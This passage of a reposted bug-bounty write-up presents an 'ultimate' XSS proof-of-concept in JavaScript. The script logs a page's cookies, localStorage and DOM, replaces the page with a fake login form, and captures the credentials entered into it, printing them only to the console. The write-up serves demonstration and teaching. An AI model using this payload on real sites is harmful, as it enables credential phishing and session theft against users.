# :globe_with_meridians: The Ultimate XSS PoC with ChatGPT-4 🎯

> **Original Source:** [The Ultimate XSS PoC with ChatGPT-4 🎯](https://infosecwriteups.com/the-ultimate-xss-poc-with-chatgpt-4-2be606a13a2e)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## Step 3: Create a Fake Login Page 🚪


Next, we’ll create a fake login page to replace the current page content:


```
const fakeLoginPage = `
<style>
/* ...some CSS to style the login page... */
</style>
<form id="fakeLoginForm">
<input type="text" name="username" placeholder="Username" />
<input type="password" name="password" placeholder="Password" />
<button type="submit">Login</button>
</form>
`;

document.documentElement.innerHTML = fakeLoginPage;
```


🔎 Explanation: We define the HTML and CSS for our fake login page in a template string. Then, we replace the current page content using `document.documentElement.innerHTML`.

### How it looks rendered in the browser 👀:


## Step 4: Capture Username/Password 📤


Finally, we’ll log submitted username/password credentials to the console:


```
const form = document.getElementById('fakeLoginForm');

form.addEventListener('submit', (e) => {
e.preventDefault();

const username = form.elements['username'].value;
const password = form.elements['password'].value;

console.log(`%cHacked Username: %c${username}`, 'color: red', 'color: blue');
console.log(`%cHacked Password: %c${password}`, 'color: red', 'color: blue');
});
```


🔎 Explanation: We access the form using `document.getElementById` and add an event listener for the `submit` event. To prevent the default form submission behavior, we call `e.preventDefault()`. Then, we extract the username and password values and log them to the console with the same formatting used earlier.

### How it looks in the DevTools console 👀:


## Putting It All Together: The Ultimate XSS PoC 🌟


Now that we have all the pieces, let’s combine them into a single JS file:


```
// Log cookies, local storage, and DOM contents
console.log(`%cHacked Cookies: %c${document.cookie}`, 'color: red', 'color: blue');
console.log(`%cHacked Local Storage: %c${JSON.stringify(localStorage)}`, 'color: red', 'color: blue');
console.log(`%cHacked DOM Contents: %c${document.documentElement.innerHTML}`, 'color: red', 'color: blue');

// Create a fake login page
const fakeLoginPage = `
<style>
/* ...some CSS to style the login page... */
</style>
<form id="fakeLoginForm">
<input type="text" name="username" placeholder="Username" />
<input type="password" name="password" placeholder="Password" />
<button type="submit">Login</button>
</form>
`;

document.documentElement.innerHTML = fakeLoginPage;

// Log form submissions to the console
const form = document.getElementById('fakeLoginForm');

form.addEventListener('submit', (e) => {
e.preventDefault();

const username = form.elements['username'].value;
const password = form.elements['password'].value;

console.log(`%cHacked Username: %c${username}`, 'color: red', 'color: blue');
console.log(`%cHacked Password: %c${password}`, 'color: red', 'color: blue');
});
```


[Github repository](https://github.com/TakSec/XSS-PoCs) for this XSS PoC and others as they get added.


Voilà! You now have a powerful XSS PoC to demonstrate vulnerabilities in style. 🎉


Remember, the goal is to help developers understand the risks and fix security issues. Happy bug hunting, and keep making the web a safer place! 💻✨

---

*Originally published on [Medium](https://infosecwriteups.com/the-ultimate-xss-poc-with-chatgpt-4-2be606a13a2e). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
